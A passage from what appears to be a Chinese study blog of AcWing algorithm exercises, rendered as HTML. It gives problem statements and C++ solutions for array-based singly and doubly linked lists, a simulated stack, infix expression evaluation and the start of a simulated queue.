ne[idx]=head;<br>    head=idx;<br>    idx++;<br>&#125;<br><span class="hljs-comment">//插到下标为k的地方</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> pos,<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    e[idx]=x;<br>    ne[idx]=ne[pos];<br>    ne[pos]=idx;<br>    idx++;<br>&#125;<br><span class="hljs-comment">//删除下标为k的后面的结点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> pos)</span></span><br><span class="hljs-function"></span>&#123;<br>    ne[k]=ne[ne[k]];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="826-单链表"><a href="#826-单链表" class="headerlink" title="826. 单链表"></a>826. 单链表</h2><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>实现一个单链表，链表初始为空，支持三种操作：<br><br>向链表头插入一个数；<br>删除第 <span class="hljs-variable">k</span> 个插入的数后面的数；<br>在第 <span class="hljs-variable">k</span> 个插入的数后插入一个数。<br>现在要对该链表进行 <span class="hljs-variable">M</span> 次操作，进行完所有操作后，从头到尾输出整个链表。<br><br>注意<span class="hljs-operator">:</span>题目中第 <span class="hljs-variable">k</span> 个插入的数并不是指当前链表的第 <span class="hljs-variable">k</span> 个数。例如操作过程中一共插入了 <span class="hljs-variable">n</span> 个数，则按照插入的时间顺序，这 <span class="hljs-variable">n</span> 个数依次为：第 <span class="hljs-number">1</span> 个插入的数，第 <span class="hljs-number">2</span> 个插入的数，…第 <span class="hljs-variable">n</span> 个插入的数。<br><br>输入格式<br>第一行包含整数 <span class="hljs-variable">M</span>，表示操作次数。<br><br>接下来 <span class="hljs-variable">M</span> 行，每行包含一个操作命令，操作命令可能为以下几种：<br><br><span class="hljs-variable">H</span> <span class="hljs-variable">x</span>，表示向链表头插入一个数 <span class="hljs-variable">x</span>。<br><span class="hljs-built_in">D</span> <span class="hljs-variable">k</span>，表示删除第 <span class="hljs-variable">k</span> 个插入的数后面的数（当 <span class="hljs-variable">k</span> 为 <span class="hljs-number">0</span> 时，表示删除头结点）。<br><span class="hljs-built_in">I</span> <span class="hljs-variable">k</span> <span class="hljs-variable">x</span>，表示在第 <span class="hljs-variable">k</span> 个插入的数后面插入一个数 <span class="hljs-variable">x</span>（此操作中 <span class="hljs-variable">k</span> 均大于 <span class="hljs-number">0</span>）。<br>输出格式<br>共一行，将整个链表从头到尾输出。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-variable">M</span>≤<span class="hljs-number">100000</span><br>所有操作保证合法。<br><br>输入样例：<br><span class="hljs-number">10</span><br><span class="hljs-variable">H</span> <span class="hljs-number">9</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-built_in">D</span> <span class="hljs-number">1</span><br><span class="hljs-built_in">D</span> <span class="hljs-number">0</span><br><span class="hljs-variable">H</span> <span class="hljs-number">6</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br><span class="hljs-built_in">I</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-built_in">D</span> <span class="hljs-number">6</span><br>输出样例：<br><span class="hljs-number">6</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> val[N],ne[N],head,idx;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head=<span class="hljs-number">-1</span>;<br>    idx=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_to_head</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br>    val[idx]=x;<br>    ne[idx]=head;<br>    head=idx;<br>    idx++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deletex</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    ne[k]=ne[ne[k]];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=x;<br>    ne[idx]=ne[k];<br>    ne[k]=idx;<br>    idx++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-type">char</span> oper;<br>    <span class="hljs-type">int</span> n,x,k;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        cin&gt;&gt;oper;<br>        <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&#x27;H&#x27;</span>)&#123;<br>            cin&gt;&gt;x;<br>            <span class="hljs-built_in">add_to_head</span>(x);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&#x27;I&#x27;</span>)&#123;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            <span class="hljs-built_in">add</span>(k<span class="hljs-number">-1</span>,x);<span class="hljs-comment">//减一和上面原理一样</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            cin&gt;&gt;x;<br>            <span class="hljs-keyword">if</span>(x==<span class="hljs-number">0</span>) head=ne[head];<span class="hljs-comment">//删去首节点也好理解，就是修改head最开始指向为原head指向的下一个指向</span><br>            <span class="hljs-built_in">deletex</span>(x<span class="hljs-number">-1</span>);<span class="hljs-comment">//为什么要减去一，因为idx是从0开始，而k是从1开始，删除第k个插入的数，就相当于</span><br>            <span class="hljs-comment">//在程序中删除第x-1个数</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> index=head;<br>    <span class="hljs-keyword">while</span>(index!=<span class="hljs-number">-1</span>)<br>    &#123;<br>        cout&lt;&lt;val[index]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        index=ne[index];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h2><p><a href="https://www.acwing.com/solution/content/5052/">双链表具体详解</a></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs tap">827. 双链表<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>实现一个双链表，双链表初始为空，支持<span class="hljs-number"> 5 </span>种操作：<br><br>在最左侧插入一个数；<br>在最右侧插入一个数；<br>将第 k 个插入的数删除；<br>在第 k 个插入的数左侧插入一个数；<br>在第 k 个插入的数右侧插入一个数<br>现在要对该链表进行 M 次操作，进行完所有操作后，从左到右输出整个链表。<br><br>注意:题目中第 k 个插入的数并不是指当前链表的第 k 个数。例如操作过程中一共插入了 n 个数，则按照插入的时间顺序，这 n 个数依次为：第<span class="hljs-number"> 1 </span>个插入的数，第<span class="hljs-number"> 2 </span>个插入的数，…第 n 个插入的数。<br><br>输入格式<br>第一行包含整数 M，表示操作次数。<br><br>接下来 M 行，每行包含一个操作命令，操作命令可能为以下几种：<br><br>L x，表示在链表的最左端插入数 x。<br>R x，表示在链表的最右端插入数 x。<br>D k，表示将第 k 个插入的数删除。<br>IL k x，表示在第 k 个插入的数左侧插入一个数。<br>IR k x，表示在第 k 个插入的数右侧插入一个数。<br>输出格式<br>共一行，将整个链表从左到右输出。<br><br>数据范围<br>1≤M≤100000<br>所有操作保证合法。<br><br>输入样例：<br>10<br>R 7<br>D 1<br>L 3<br>IL<span class="hljs-number"> 2 </span>10<br>D 3<br>IL<span class="hljs-number"> 2 </span>7<br>L 8<br>R 9<br>IL<span class="hljs-number"> 4 </span>7<br>IR<span class="hljs-number"> 2 </span>2<br>输出样例：<br>8<span class="hljs-number"> 7 </span>7<span class="hljs-number"> 3 </span>2 9<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//这里填你的代码^^</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> val[N],l[N],r[N],idx;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=x;<br>    l[idx]=k;<br>    r[idx]=r[k];<br>    l[r[k]]=idx;<br>    r[k]=idx;<br>    idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    r[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<span class="hljs-comment">//下标为0一定为头指针</span><br>    l[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<span class="hljs-comment">//下标为1一定为尾指针</span><br>    idx=<span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    r[l[k]]=r[k];<br>    l[r[k]]=l[k];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        string oper;<br>        <span class="hljs-type">int</span> k,x;<br>        cin&gt;&gt;oper;<br>        <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;L&quot;</span>)<br>        &#123;<br>            cin&gt;&gt;x;<br>            <span class="hljs-built_in">insert</span>(<span class="hljs-number">0</span>,x);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;R&quot;</span>)<br>        &#123;<br>          cin&gt;&gt;x;<br>          <span class="hljs-built_in">insert</span>(l[<span class="hljs-number">1</span>],x);<span class="hljs-comment">//因为add函数是向右插，所以向左移动一位然后在该地插入，就相当于在原来的左边插入</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;IL&quot;</span>)<br>        &#123;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            <span class="hljs-built_in">insert</span>(l[k+<span class="hljs-number">1</span>],x);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(oper==<span class="hljs-string">&quot;IR&quot;</span>)<br>        &#123;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            <span class="hljs-built_in">insert</span>(k+<span class="hljs-number">1</span>,x);<span class="hljs-comment">//因为idx从2开始，而k从1开始，所以要加一</span><br>            <span class="hljs-comment">//这里不用r[k+1]的原因是add函数是从k的右边插入，而k下标就对应了插入的k个数</span><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            cin&gt;&gt;k;<br>            <span class="hljs-built_in">remove</span>(k+<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> cnt=r[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">while</span>(cnt!=<span class="hljs-number">1</span>)<br>    &#123;<br>        cout&lt;&lt;val[cnt]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        cnt=r[cnt];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//注意代码要放在两组三个点之间，才可以正确显示代码高亮哦~</span><br><br></code></pre></td></tr></table></figure><h1 id="栈和单调栈"><a href="#栈和单调栈" class="headerlink" title="栈和单调栈"></a>栈和单调栈</h1><h2 id="表达式求值（栈的应用）"><a href="#表达式求值（栈的应用）" class="headerlink" title="表达式求值（栈的应用）"></a>表达式求值（栈的应用）</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">828</span>. 模拟栈<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>实现一个栈，栈初始为空，支持四种操作：<br><br>push <span class="hljs-keyword">x</span> – 向栈顶插入一个数 <span class="hljs-keyword">x</span>；<br><span class="hljs-keyword">pop</span> – 从栈顶弹出一个数；<br><span class="hljs-built_in">empty</span> – 判断栈是否为空；<br>query – 查询栈顶元素。<br>现在要对栈进行 M 个操作，其中的每个操作 <span class="hljs-number">3</span> 和操作 <span class="hljs-number">4</span> 都要输出相应的结果。<br><br>输入格式<br>第一行包含整数 M，表示操作次数。<br><br>接下来 M 行，每行包含一个操作命令，操作命令为 push <span class="hljs-keyword">x</span>，<span class="hljs-keyword">pop</span>，<span class="hljs-built_in">empty</span>，query 中的一种。<br><br>输出格式<br>对于每个 <span class="hljs-built_in">empty</span> 和 query 操作都要输出一个查询结果，每个结果占一行。<br><br>其中，<span class="hljs-built_in">empty</span> 操作的查询结果为 YES 或 NO，query 操作的查询结果为一个整数，表示栈顶元素的值。<br><br>数据范围<br><span class="hljs-number">1</span>≤M≤<span class="hljs-number">100000</span>,<br><span class="hljs-number">1</span>≤<span class="hljs-keyword">x</span>≤<span class="hljs-number">109</span><br>所有操作保证合法。<br><br>输入样例：<br><span class="hljs-number">10</span><br>push <span class="hljs-number">5</span><br>query<br>push <span class="hljs-number">6</span><br><span class="hljs-keyword">pop</span><br>query<br><span class="hljs-keyword">pop</span><br><span class="hljs-built_in">empty</span><br>push <span class="hljs-number">4</span><br>query<br><span class="hljs-built_in">empty</span><br>输出样例：<br><span class="hljs-number">5</span><br><span class="hljs-number">5</span><br>YES<br><span class="hljs-number">4</span><br>NO<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cctype&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>stack&lt;<span class="hljs-type">int</span>&gt; num;<br>stack&lt;<span class="hljs-type">int</span>&gt; op;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">eval</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> b=num.<span class="hljs-built_in">top</span>();num.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-type">int</span> a=num.<span class="hljs-built_in">top</span>();num.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-type">char</span> operation=op.<span class="hljs-built_in">top</span>();op.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&#x27;+&#x27;</span>) ans=a+b;<br>    <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&#x27;-&#x27;</span>) ans=a-b;<br>    <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&#x27;*&#x27;</span>) ans=a*b;<br>    <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&#x27;/&#x27;</span>) ans=a/b;<br>    num.<span class="hljs-built_in">push</span>(ans);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; h=&#123;&#123;<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-number">1</span>&#125;,&#123;<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-number">1</span>&#125;,&#123;<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-number">2</span>&#125;,&#123;<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-number">2</span>&#125;&#125;;<br>    string s;<br>    cin&gt;&gt;s;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;s.<span class="hljs-built_in">size</span>();i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">isdigit</span>(s[i]))&#123;<br>            <span class="hljs-type">int</span> j=i,a=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>(j&lt;s.<span class="hljs-built_in">size</span>()&amp;&amp;<span class="hljs-built_in">isdigit</span>(s[j]))<br>            &#123;<br>                a=a*<span class="hljs-number">10</span>+s[j]-<span class="hljs-string">&#x27;0&#x27;</span>;<br>                j++;<br>            &#125;<br>            num.<span class="hljs-built_in">push</span>(a);<br>            i=j<span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;(&#x27;</span>) op.<span class="hljs-built_in">push</span>(s[i]);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;)&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(op.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;(&#x27;</span>) <span class="hljs-built_in">eval</span>();<br>            op.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">while</span>(op.<span class="hljs-built_in">size</span>()&amp;&amp;h[op.<span class="hljs-built_in">top</span>()]&gt;=h[s[i]]) <span class="hljs-built_in">eval</span>();<br>            op.<span class="hljs-built_in">push</span>(s[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(op.<span class="hljs-built_in">size</span>()) <span class="hljs-built_in">eval</span>();<br>    cout&lt;&lt;num.<span class="hljs-built_in">top</span>()&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="模拟队列和单调队列"><a href="#模拟队列和单调队列" class="headerlink" title="模拟队列和单调队列"></a>模拟队列和单调队列</h1><h2 id="模拟队列"><a href="#模拟队列" class="headerlink" title="模拟队列"></a>模拟队列</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs arcade">实现一个队列，队列初始为空，支持四种操作：<br><br><span class="hljs-built_in">push</span> x – 向队尾插入一个数 x；<br><span class="hljs-built_in">pop</span> – 从队头弹出一个数；<br>empty – 判断队列是否为空；<br>query – 查询队头元素。<br>现在要对队列进行 M 个操作，其中的每个操作 <span class="hljs-number">3</span> 和操作 <span class="hljs-number">4</span> 都要输出相应的结果。<br><br>输入格式<br>第一行包含整数 M，表示操作次数。<br><br>接下来 M 行，每行包含一个操作命令，操作命令为 <span class="hljs-built_in">push</span> x，<span class="hljs-built_in">pop</span>，empty，query 中的一种。<br><br>输出格式<br>对于每个 empty 和 query 操作都要输出一个查询结果，每个结果占一行。<br><br>其中，empty 操作的查询结果为 YES 或 NO，query 操作的查询结果为一个整数，表示队头元素的值。<br><br>数据范围<br><span class="hljs-number">1</span>≤M≤<span 